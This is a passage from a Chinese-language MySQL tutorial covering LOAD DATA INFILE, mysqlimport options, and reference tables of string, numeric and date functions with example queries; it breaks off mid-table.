class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl;</span><br></pre></td></tr></table></figure><p>　如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。</p><p>你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。</p><p>两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。</p><p>如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl</span><br><span class="line">  -&gt; FIELDS TERMINATED BY &#x27;:&#x27;</span><br><span class="line">  -&gt; LINES TERMINATED BY &#x27;\r\n&#x27;;</span><br></pre></td></tr></table></figure><p>LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。</p><p>如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; </span><br><span class="line">    -&gt; INTO TABLE mytbl (b, c, a);</span><br></pre></td></tr></table></figure><hr><h2 id="4、使用-mysqlimport-导入数据"><a href="#4、使用-mysqlimport-导入数据" class="headerlink" title="4、使用 mysqlimport 导入数据"></a>4、使用 mysqlimport 导入数据</h2><p>mysqlimport 客户端提供了 LOAD DATA INFILEQL 语句的一个命令行接口。mysqlimport 的大多数选项直接对应 LOAD DATA INFILE 子句。</p><p>从文件 dump.txt 中将数据导入到 mytbl 数据表中, 可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><p>mysqlimport 命令可以指定选项来设置指定格式,命令语句格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local --fields-terminated-by=&quot;:&quot; \</span><br><span class="line">   --lines-terminated-by=&quot;\r\n&quot;  mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><p>mysqlimport 语句中使用 –columns 选项来设置列的顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local --columns=b,c,a \</span><br><span class="line">    mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><hr><h2 id="mysqlimport的常用选项介绍"><a href="#mysqlimport的常用选项介绍" class="headerlink" title="mysqlimport的常用选项介绍"></a>mysqlimport的常用选项介绍</h2><table><thead><tr><th align="left">选项</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">-d or –delete</td><td align="left">新数据导入数据表中之前删除数据数据表中的所有信息</td></tr><tr><td align="left">-f or –force</td><td align="left">不管是否遇到错误，mysqlimport将强制继续插入数据</td></tr><tr><td align="left">-i or –ignore</td><td align="left">mysqlimport跳过或者忽略那些有相同唯一 关键字的行， 导入文件中的数据将被忽略。</td></tr><tr><td align="left">-l or -lock-tables</td><td align="left">数据被插入之前锁住表，这样就防止了， 你在更新数据库时，用户的查询和更新受到影响。</td></tr><tr><td align="left">-r or -replace</td><td align="left">这个选项与－i选项的作用相反；此选项将替代 表中有相同唯一关键字的记录。</td></tr><tr><td align="left">–fields-enclosed- by= char</td><td align="left">指定文本文件中数据的记录时以什么括起的， 很多情况下 数据以双引号括起。 默认的情况下数据是没有被字符括起的。</td></tr><tr><td align="left">–fields-terminated- by=char</td><td align="left">指定各个数据的值之间的分隔符，在句号分隔的文件中， 分隔符是句号。您可以用此选项指定数据之间的分隔符。 默认的分隔符是跳格符（Tab）</td></tr><tr><td align="left">–lines-terminated- by=str</td><td align="left">此选项指定文本文件中行与行之间数据的分隔字符串 或者字符。 默认的情况下mysqlimport以newline为行分隔符。 您可以选择用一个字符串来替代一个单个的字符： 一个新行或者一个回车。</td></tr></tbody></table><p>mysqlimport 命令常用的选项还有 -v 显示版本（version）， -p 提示输入密码（password）等。</p><h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p>MySQL 有很多内置的函数，以下列出了这些函数的说明。</p><hr><h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><table><thead><tr><th align="left">函数</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ASCII(s)</td><td align="left">返回字符串 s 的第一个字符的 ASCII 码。</td><td align="left">返回 CustomerName 字段第一个字母的 ASCII 码：<code>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers;</code></td></tr><tr><td align="left">CHAR_LENGTH(s)</td><td align="left">返回字符串 s 的字符数</td><td align="left">返回字符串 RUNOOB 的字符数<code>SELECT CHAR_LENGTH(&quot;RUNOOB&quot;) AS LengthOfString; </code></td></tr><tr><td align="left">CHARACTER_LENGTH(s)</td><td align="left">返回字符串 s 的字符数</td><td align="left">返回字符串 RUNOOB 的字符数<code>SELECT CHARACTER_LENGTH(&quot;RUNOOB&quot;) AS LengthOfString; </code></td></tr><tr><td align="left">CONCAT(s1,s2…sn)</td><td align="left">字符串 s1,s2 等多个字符串合并为一个字符串</td><td align="left">合并多个字符串<code>SELECT CONCAT(&quot;SQL &quot;, &quot;Runoob &quot;, &quot;Gooogle &quot;, &quot;Facebook&quot;) AS ConcatenatedString; </code></td></tr><tr><td align="left">CONCAT_WS(x, s1,s2…sn)</td><td align="left">同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</td><td align="left">合并多个字符串，并添加分隔符：<code>SELECT CONCAT_WS(&quot;-&quot;, &quot;SQL&quot;, &quot;Tutorial&quot;, &quot;is&quot;, &quot;fun!&quot;)AS ConcatenatedString; </code></td></tr><tr><td align="left">FIELD(s,s1,s2…)</td><td align="left">返回第一个字符串 s 在字符串列表(s1,s2…)中的位置</td><td align="left">返回字符串 c 在列表值中的位置：<code>SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;); </code></td></tr><tr><td align="left">FIND_IN_SET(s1,s2)</td><td align="left">返回在字符串s2中与s1匹配的字符串的位置</td><td align="left">返回字符串 c 在指定字符串中的位置：<code>SELECT FIND_IN_SET(&quot;c&quot;, &quot;a,b,c,d,e&quot;); </code></td></tr><tr><td align="left">FORMAT(x,n)</td><td align="left">函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。</td><td align="left">格式化数字 “#,###.##” 形式：<code>SELECT FORMAT(250500.5634, 2);     -- 输出 250,500.56 </code></td></tr><tr><td align="left">INSERT(s1,x,len,s2)</td><td align="left">字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</td><td align="left">从字符串第一个位置开始的 6 个字符替换为 runoob：<code>SELECT INSERT(&quot;google.com&quot;, 1, 6, &quot;runoob&quot;);  -- 输出：runoob.com </code></td></tr><tr><td align="left">LOCATE(s1,s)</td><td align="left">从字符串 s 中获取 s1 的开始位置</td><td align="left">获取 b 在字符串 abc 中的位置：<code>SELECT LOCATE(&#39;st&#39;,&#39;myteststring&#39;);  -- 5 </code>返回字符串 abc 中 b 的位置：<code>SELECT LOCATE(&#39;b&#39;, &#39;abc&#39;) -- 2</code></td></tr><tr><td align="left">LCASE(s)</td><td align="left">将字符串 s 的所有字母变成小写字母</td><td align="left">字符串 RUNOOB 转换为小写：<code>SELECT LCASE(&#39;RUNOOB&#39;) -- runoob </code></td></tr><tr><td align="left">LEFT(s,n)</td><td align="left">返回字符串 s 的前 n 个字符</td><td align="left">返回字符串 runoob 中的前两个字符：<code>SELECT LEFT(&#39;runoob&#39;,2) -- ru </code></td></tr><tr><td align="left">LOWER(s)</td><td align="left">将字符串 s 的所有字母变成小写字母</td><td align="left">字符串 RUNOOB 转换为小写：<code>SELECT LOWER(&#39;RUNOOB&#39;) -- runoob </code></td></tr><tr><td align="left">LPAD(s1,len,s2)</td><td align="left">在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len</td><td align="left">将字符串 xx 填充到 abc 字符串的开始处：<code>SELECT LPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- xxabc </code></td></tr><tr><td align="left">LTRIM(s)</td><td align="left">去掉字符串 s 开始处的空格</td><td align="left">去掉字符串 RUNOOB开始处的空格：<code>SELECT LTRIM(&quot;    RUNOOB&quot;) AS LeftTrimmedString;-- RUNOOB </code></td></tr><tr><td align="left">MID(s,n,len)</td><td align="left">从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT MID(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">POSITION(s1 IN s)</td><td align="left">从字符串 s 中获取 s1 的开始位置</td><td align="left">返回字符串 abc 中 b 的位置：<code>SELECT POSITION(&#39;b&#39; in &#39;abc&#39;) -- 2 </code></td></tr><tr><td align="left">REPEAT(s,n)</td><td align="left">将字符串 s 重复 n 次</td><td align="left">将字符串 runoob 重复三次：<code>SELECT REPEAT(&#39;runoob&#39;,3) -- runoobrunoobrunoob </code></td></tr><tr><td align="left">REPLACE(s,s1,s2)</td><td align="left">将字符串 s2 替代字符串 s 中的字符串 s1</td><td align="left">将字符串 abc 中的字符 a 替换为字符 x：<code>SELECT REPLACE(&#39;abc&#39;,&#39;a&#39;,&#39;x&#39;) --xbc </code></td></tr><tr><td align="left">REVERSE(s)</td><td align="left">将字符串s的顺序反过来</td><td align="left">将字符串 abc 的顺序反过来：<code>SELECT REVERSE(&#39;abc&#39;) -- cba </code></td></tr><tr><td align="left">RIGHT(s,n)</td><td align="left">返回字符串 s 的后 n 个字符</td><td align="left">返回字符串 runoob 的后两个字符：<code>SELECT RIGHT(&#39;runoob&#39;,2) -- ob </code></td></tr><tr><td align="left">RPAD(s1,len,s2)</td><td align="left">在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</td><td align="left">将字符串 xx 填充到 abc 字符串的结尾处：<code>SELECT RPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- abcxx </code></td></tr><tr><td align="left">RTRIM(s)</td><td align="left">去掉字符串 s 结尾处的空格</td><td align="left">去掉字符串 RUNOOB 的末尾空格：<code>SELECT RTRIM(&quot;RUNOOB     &quot;) AS RightTrimmedString;   -- RUNOOB </code></td></tr><tr><td align="left">SPACE(n)</td><td align="left">返回 n 个空格</td><td align="left">返回 10 个空格：<code>SELECT SPACE(10); </code></td></tr><tr><td align="left">STRCMP(s1,s2)</td><td align="left">比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</td><td align="left">比较字符串：<code>SELECT STRCMP(&quot;runoob&quot;, &quot;runoob&quot;);  -- 0 </code></td></tr><tr><td align="left">SUBSTR(s, start, length)</td><td align="left">从字符串 s 的 start 位置截取长度为 length 的子字符串</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT SUBSTR(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">SUBSTRING(s, start, length)</td><td align="left">从字符串 s 的 start 位置截取长度为 length 的子字符串</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT SUBSTRING(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">SUBSTRING_INDEX(s, delimiter, number)</td><td align="left">返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。 如果 number 是正数，返回第 number 个字符左边的字符串。 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。</td><td align="left"><code>SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,1) -- a SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,-1)  -- b SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;a*b*c*d*e&#39;,&#39;*&#39;,3),&#39;*&#39;,-1)  -- c </code></td></tr><tr><td align="left">TRIM(s)</td><td align="left">去掉字符串 s 开始和结尾处的空格</td><td align="left">去掉字符串 RUNOOB 的首尾空格：<code>SELECT TRIM(&#39;    RUNOOB    &#39;) AS TrimmedString; </code></td></tr><tr><td align="left">UCASE(s)</td><td align="left">将字符串转换为大写</td><td align="left">将字符串 runoob 转换为大写：<code>SELECT UCASE(&quot;runoob&quot;); -- RUNOOB </code></td></tr><tr><td align="left">UPPER(s)</td><td align="left">将字符串转换为大写</td><td align="left">将字符串 runoob 转换为大写：<code>SELECT UPPER(&quot;runoob&quot;); -- RUNOOB </code></td></tr></tbody></table><hr><h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ABS(x)</td><td align="left">返回 x 的绝对值</td><td align="left">返回 -1 的绝对值：<code>SELECT ABS(-1) -- 返回1 </code></td></tr><tr><td align="left">ACOS(x)</td><td align="left">求 x 的反余弦值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ACOS(0.25); </code></td></tr><tr><td align="left">ASIN(x)</td><td align="left">求反正弦值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ASIN(0.25); </code></td></tr><tr><td align="left">ATAN(x)</td><td align="left">求反正切值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ATAN(2.5); </code></td></tr><tr><td align="left">ATAN2(n, m)</td><td align="left">求反正切值（单位为弧度）</td><td align="left"><code>SELECT ATAN2(-0.8, 2); </code></td></tr><tr><td align="left">AVG(expression)</td><td align="left">返回一个表达式的平均值，expression 是一个字段</td><td align="left">返回 Products 表中Price 字段的平均值：<code>SELECT AVG(Price) AS AveragePrice FROM Products; </code></td></tr><tr><td align="left">CEIL(x)</td><td align="left">返回大于或等于 x 的最小整数</td><td align="left"><code>SELECT CEIL(1.5) -- 返回2 </code></td></tr><tr><td align="left">CEILING(x)</td><td align="left">返回大于或等于 x 的最小整数</td><td align="left"><code>SELECT CEILING(1.5); -- 返回2 </code></td></tr><tr><td align="left">COS(x)</td><td align="left">求余弦值(参数是弧度)</td><td align="left"><code>SELECT COS(2); </code></td></tr><tr><td align="left">COT(x)</td><td align="left">求余切值(参数是弧度)</td><td align="left"><code>SELECT COT(6); </code></td></tr><tr><td align="left">COUNT(expression)</td><td align="left">返回查询的记录总数，expression 参数是一个字段或者 * 号</td><td align="left">返回 Products 表中 products 字段总共有多少条记录：<code>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; </code></td></tr><tr><td align="left">DEGREES(x)</td><td align="left">将弧度转换为角度</td><td align="left"><code>SELECT DEGREES(3.1415926535898) -- 180 </code></td></tr><tr><td align="left">n DIV m</td><td align="left">整除，n 为被除数，m 为除数</td><td align="left">计算 10 除于 5：<code>SELECT 10 DIV 5;  -- 2 </code></td></tr><tr><td align="left">EXP(x)</td><td align="left">返回 e 的 x 次方</td><td align="left">计算 e 的三次方：<code>SELECT EXP(3) -- 20.085536923188 </code></td></tr><tr><td align="left">FLOOR(x)</td><td align="left">返回小于或等于 x 的最大整数</td><td align="left">小于或等于 1.5 的整数：<code>SELECT FLOOR(1.5) -- 返回1 </code></td></tr><tr><td align="left">GREATEST(expr1, expr2, expr3, …)</td><td align="left">返回列表中的最大值</td><td align="left">返回以下数字列表中的最大值：<code>SELECT GREATEST(3, 12, 34, 8, 25); -- 34 </code>返回以下字符串列表中的最大值：<code>SELECT GREATEST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Runoob </code></td></tr><tr><td align="left">LEAST(expr1, expr2, expr3, …)</td><td align="left">返回列表中的最小值</td><td align="left">返回以下数字列表中的最小值：<code>SELECT LEAST(3, 12, 34, 8, 25); -- 3 </code>返回以下字符串列表中的最小值：<code>SELECT LEAST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Apple </code></td></tr><tr><td align="left">LN</td><td align="left">返回数字的自然对数，以 e 为底。</td><td align="left">返回 2 的自然对数：<code>SELECT LN(2);  -- 0.6931471805599453 </code></td></tr><tr><td align="left">LOG(x) 或 LOG(base, x)</td><td align="left">返回自然对数(以 e 为底的对数)，如果带有 base 参数，则 base 为指定带底数。</td><td align="left"><code>SELECT LOG(20.085536923188) -- 3 SELECT LOG(2, 4); -- 2 </code></td></tr><tr><td align="left">LOG10(x)</td><td align="left">返回以 10 为底的对数</td><td align="left"><code>SELECT LOG10(100) -- 2</code></td></tr><tr><td align="left">LOG2(x)</td><td align="left">返回以 2 为底的对数</td><td align="left">返回以 2 为底 6 的对数：<code>SELECT LOG2(6);  -- 2.584962500721156 </code></td></tr><tr><td align="left">MAX(expression)</td><td align="left">返回字段 expression 中的最大值</td><td align="left">返回数据表 Products 中字段 Price 的最大值：<code>SELECT MAX(Price) AS LargestPrice FROM Products; </code></td></tr><tr><td align="left">MIN(expression)</td><td align="left">返回字段 expression 中的最小值</td><td align="left">返回数据表 Products 中字段 Price 的最小值：<code>SELECT MIN(Price) AS MinPrice FROM Products; </code></td></tr><tr><td align="left">MOD(x,y)</td><td align="left">返回 x 除以 y 以后的余数</td><td align="left">5 除于 2 的余数：<code>SELECT MOD(5,2) -- 1 </code></td></tr><tr><td align="left">PI()</td><td align="left">返回圆周率(3.141593）</td><td align="left"><code>SELECT PI() --3.141593 </code></td></tr><tr><td align="left">POW(x,y)</td><td align="left">返回 x 的 y 次方</td><td align="left">2 的 3 次方：<code>SELECT POW(2,3) -- 8 </code></td></tr><tr><td align="left">POWER(x,y)</td><td align="left">返回 x 的 y 次方</td><td align="left">2 的 3 次方：<code>SELECT POWER(2,3) -- 8 </code></td></tr><tr><td align="left">RADIANS(x)</td><td align="left">将角度转换为弧度</td><td align="left">180 度转换为弧度：<code>SELECT RADIANS(180) -- 3.1415926535898 </code></td></tr><tr><td align="left">RAND()</td><td align="left">返回 0 到 1 的随机数</td><td align="left"><code>SELECT RAND() --0.93099315644334 </code></td></tr><tr><td align="left">ROUND(x)</td><td align="left">返回离 x 最近的整数</td><td align="left"><code>SELECT ROUND(1.23456) --1 </code></td></tr><tr><td align="left">SIGN(x)</td><td align="left">返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1</td><td align="left"><code>SELECT SIGN(-10) -- (-1) </code></td></tr><tr><td align="left">SIN(x)</td><td align="left">求正弦值(参数是弧度)</td><td align="left"><code>SELECT SIN(RADIANS(30)) -- 0.5 </code></td></tr><tr><td align="left">SQRT(x)</td><td align="left">返回x的平方根</td><td align="left">25 的平方根：<code>SELECT SQRT(25) -- 5 </code></td></tr><tr><td align="left">SUM(expression)</td><td align="left">返回指定字段的总和</td><td align="left">计算 OrderDetails 表中字段 Quantity 的总和：<code>SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; </code></td></tr><tr><td align="left">TAN(x)</td><td align="left">求正切值(参数是弧度)</td><td align="left"><code>SELECT TAN(1.75);  -- -5.52037992250933 </code></td></tr><tr><td align="left">TRUNCATE(x,y)</td><td align="left">返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）</td><td align="left"><code>SELECT TRUNCATE(1.23456,3) -- 1.234 </code></td></tr></tbody></table><hr><h2 id="MySQL-日期函数"><a href="#MySQL-日期函数" class="headerlink" title="MySQL 日期函数"></a>MySQL 日期函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ADDDATE(d,n)</td><td align="left">计算起始日期 d 加上 n 天的日期</td><td align="left"><code>SELECT ADDDATE(&quot;2017-06-15&quot;, INTERVAL 10 DAY); -&gt;2017-06-25 </code></td></tr><tr><td align="left">ADDTIME(t,n)</td><td align="left">n 是一个时间表达式，时间 t 加上时间表达式 n</td><td align="left">加 5 秒：<code>SELECT ADDTIME(&#39;2011-11-11 11:11:11&#39;, 5); -&gt;2011-11-11 11:11:16 (秒) </code>添加 2 小时, 10 分钟, 5 秒:<code>SELECT ADDTIME(&quot;2020-06-15 09:34:21&quot;, &quot;2:10:5&quot;);  -&gt; 2020-06-15 11:44:26 </code></td></tr><tr><td align="left">CURDATE()</td><td align="left">返回当前日期</td><td align="left"><code>SELECT CURDATE(); -&gt; 2018-09-19 </code></td></tr><tr><td align="left">CURRENT_DATE()</td><td align="left">返回当前日期</td><td align="left"><code>SELECT CURRENT_DATE(); -&gt; 2018-09-19 </code></td></tr><tr><td align="left">CURRENT_TIME</td><td align="left">返回当前时间</td><td align="left"><code>SELECT CURRENT_TIME(); -&gt; 19:59:02 </code></td></tr><tr><td align="left">CURRENT_TIMESTAMP()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT CURRENT_TIMESTAMP() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">CURTIME()</td><td align="left">返回当前时间</td><td align="left"><code>SELECT CURTIME(); -&gt; 19:59:02 </code></td></tr><tr><td align="left">DATE()</td><td align="left">从日期或日期时间表达式中提取日期值</td><td align="left"><code>SELECT DATE(&quot;2017-06-15&quot;);     -&gt; 2017-06-15 </code></td></tr><tr><td align="left">DATEDIFF(d1,d2)</td><td align="left">计算日期 d1-&gt;d2 之间相隔的天数</td><td align="left"><code>SELECT DATEDIFF(&#39;2001-01-01&#39;,&#39;2001-02-02&#39;) -&gt; -32 </code></td></tr><tr><td align="left">DATE_ADD(d，INTERVAL expr type)</td><td align="left">计算起始日期 d 加上一个时间段后的日期，type 值可以是：MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH</td><td align="left"><code>SELECT DATE_ADD(&quot;2017-06-15&quot;, INTERVAL 10 DAY);     -&gt; 2017-06-25 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL 15 MINUTE); -&gt; 2017-06-15 09:49:21 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL -3 HOUR); -&gt;2017-06-15 06:34:21 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL -3 HOUR); -&gt;2017-04-15 </code></td></tr><tr><td align="left">DATE_FORMAT(d,f)</td><td align="left">按表达式 f的要求显示日期 d</td><td align="left"><code>SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) -&gt; 2011-11-11 11:11:11 AM </code></td></tr><tr><td align="left">DATE_SUB(date,INTERVAL expr type)</td><td align="left">函数从日期减去指定的时间间隔。</td><td align="left">Orders 表中 OrderDate 字段减去 2 天：<code>SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders </code></td></tr><tr><td align="left">DAY(d)</td><td align="left">返回日期值 d 的日期部分</td><td align="left"><code>SELECT DAY(&quot;2017-06-15&quot;);   -&gt; 15 </code></td></tr><tr><td align="left">DAYNAME(d)</td><td align="left">返回日期 d 是星期几，如 Monday,Tuesday</td><td align="left"><code>SELECT DAYNAME(&#39;2011-11-11 11:11:11&#39;) -&gt;Friday </code></td></tr><tr><td align="left">DAYOFMONTH(d)</td><td align="left">计算日期 d 是本月的第几天</td><td align="left"><code>SELECT DAYOFMONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 </code></td></tr><tr><td align="left">DAYOFWEEK(d)</td><td align="left">日期 d 今天是星期几，1 星期日，2 星期一，以此类推</td><td align="left"><code>SELECT DAYOFWEEK(&#39;2011-11-11 11:11:11&#39;) -&gt;6 </code></td></tr><tr><td align="left">DAYOFYEAR(d)</td><td align="left">计算日期 d 是本年的第几天</td><td align="left"><code>SELECT DAYOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt;315 </code></td></tr><tr><td align="left">EXTRACT(type FROM d)</td><td align="left">从日期 d 中获取指定的值，type 指定返回的值。 type可取值为： MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH</td><td align="left"><code>SELECT EXTRACT(MINUTE FROM &#39;2011-11-11 11:11:11&#39;)  -&gt; 11 </code></td></tr><tr><td align="left">FROM_DAYS(n)</td><td align="left">计算从 0000 年 1 月 1 日开始 n 天后的日期</td><td align="left"><code>SELECT FROM_DAYS(1111) -&gt; 0003-01-16 </code></td></tr><tr><td align="left">HOUR(t)</td><td align="left">返回 t 中的小时值</td><td align="left"><code>SELECT HOUR(&#39;1:2:3&#39;) -&gt; 1 </code></td></tr><tr><td align="left">LAST_DAY(d)</td><td align="left">返回给给定日期的那一月份的最后一天</td><td align="left"><code>SELECT LAST_DAY(&quot;2017-06-20&quot;); -&gt; 2017-06-30 </code></td></tr><tr><td align="left">LOCALTIME()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT LOCALTIME() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">LOCALTIMESTAMP()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT LOCALTIMESTAMP() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">MAKEDATE(year, day-of-year)</td><td align="left">基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期</td><td align="left"><code>SELECT MAKEDATE(2017, 3); -&gt; 2017-01-03 </code></td></tr><tr><td align="left">MAKETIME(hour, minute, second)</td><td align="left">组合时间，参数分别为小时、分钟、秒</td><td align="left"><code>SELECT MAKETIME(11, 35, 4); -&gt; 11:35:04 </code></td></tr><tr><td align="left">MICROSECOND(date)</td><td align="left">返回日期参数所对应的微秒数</td><td align="left"><code>SELECT MICROSECOND(&quot;2017-06-20 09:34:00.000023&quot;); -&gt; 23 </code></td></tr><tr><td align="left">MINUTE(t)</td><td align="left">返回 t 中的分钟值</td><td align="left"><code>SELECT MINUTE(&#39;1:2:3&#39;) -&gt; 2 </code></td></tr><tr><td align="left">MONTHNAME(d)</td><td align="left">返回日期当中的月份名称，如 November</td><td align="left"><code>SELECT MONTHNAME(&#39;2011-11-11 11:11:11&#39;) -&gt; November </code></td></tr><tr><td align="left">MONTH(d)</td><td align="left">返回日期d中的月份值，1 到 12</td><td align="left"><code>SELECT MONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 </code></td></tr><tr><td align="left">NOW()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT NOW() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">PERIOD_ADD(period, number)</td><td align="left">为 年-月 组合日期添加一个时段</td><td align="left"><code>SELECT PERIOD_ADD(201703, 5);    -&gt; 201708 </code></td></tr><tr><td align="left">PERIOD_DIFF(period1, period2)</td><td align="left">返回两个时段之间的月份差值</td><td align="left"><code>SELECT PERIOD_DIFF(201710, 201703); -&gt; 7 </code></td></tr><tr><td align="left">QUARTER(d)</td><td align="left">返回日期d是第几季节，返回 1 到 4</td><td align="left"><code>SELECT QUARTER(&#39;2011-11-11 11:11:11&#39;) -&gt; 4 </code></td></tr><tr><td align="left">SECOND(t)</td><td align="left">返回 t 中的秒钟值</td><td align="left"><code>SELECT SECOND(&#39;1:2:3&#39;) -&gt; 3 </code></td></tr><tr><td align="left">SEC_TO_TIME(s)</td><td align="left">将以秒为单位的时间 s 转换为时分秒的格式</td><td align="left"><code>SELECT SEC_TO_TIME(4320) -&gt; 01:12:00 </code></td></tr><tr><td align="left">STR_TO_DATE(string, format_mask)</td><td align="left">将字符串转变为日期</td><td align="left"><code>SELECT STR_TO_DATE(&quot;August 10 2017&quot;, &quot;%M %d %Y&quot;); -&gt; 2017-08-10 </code></td></tr><tr><td align="left">SUBDATE(d,n)</td><td align="left">日期 d 减去 n 天后的日期</td><td align="left"><code>SELECT SUBDATE(&#39;2011-11-11 11:11:11&#39;, 1) -&gt;2011-11-10 11:11:11 (默认是天) </code></td></tr><tr><td align="left">SUBTIME(t,n)</td><td align="left">时间 t 减去 n 秒的时间</td><td align="left"><code>SELECT SUBTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:06 (秒) </code></td></tr><tr><td align="left">SYSDATE()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT SYSDATE() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">TIME(expression)</td><td align="left">提取传入表达式的时间部分</td><td align="left"><code>SELECT 